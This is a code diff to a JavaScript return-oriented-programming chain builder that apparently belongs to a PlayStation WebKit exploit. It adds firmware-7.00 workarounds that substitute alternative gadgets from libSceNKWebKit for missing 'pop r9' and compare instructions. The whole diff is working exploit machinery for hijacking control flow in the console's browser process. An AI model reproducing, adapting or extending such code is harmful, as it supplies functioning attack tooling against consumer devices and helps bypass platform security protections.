@@ -146,8 +146,25 @@ class rop {
         }
 
         if (r9 != undefined) {
-            this.push(this.gadgets["pop r9"]);
-            this.push(r9);
+            // Some builds (7.00) have no `pop r9 ; ret` at all; their profile
+            // supplies a zeroing gadget that consumes no stack slot instead.
+            // Every 6-argument call the engine makes passes r9 = 0, so this is
+            // exact -- but refuse loudly rather than silently pass 0 if that
+            // ever stops being true.
+            if (typeof OFFSET_wk_r9_zero_only !== "undefined"
+                && OFFSET_wk_r9_zero_only) {
+                const isZero = (typeof r9 === "number")
+                    ? r9 === 0
+                    : (r9 && r9.low === 0 && r9.hi === 0);
+                if (!isZero)
+                    throw new Error("this firmware profile can only set r9 = 0"
+                        + " (no `pop r9 ; ret` in libSceNKWebKit), but r9 = "
+                        + r9.toString());
+                this.push(this.gadgets["pop r9"]);
+            } else {
+                this.push(this.gadgets["pop r9"]);
+                this.push(r9);
+            }
         }
 
     }
@@ -366,6 +383,16 @@ class rop {
         this.push(this.gadgets["cmp [rcx], eax"]);
         this.push(this.gadgets["pop rax"]);
         this.push(0);
+
+        // Some builds (7.00) only have `cmp eax, [rcx] ; ret`. ZF survives the
+        // operand swap, so EQUAL is exact; the ordered types would silently
+        // invert, so refuse them.
+        if (typeof OFFSET_wk_cmp_operands_reversed !== "undefined"
+            && OFFSET_wk_cmp_operands_reversed
+            && type != this.branch_types.EQUAL) {
+            throw new Error("this firmware profile's compare gadget has"
+                + " reversed operands; only branch_types.EQUAL is supported");
+        }
 
         if (type == this.branch_types.EQUAL) {
             this.push(this.gadgets["sete al"]);
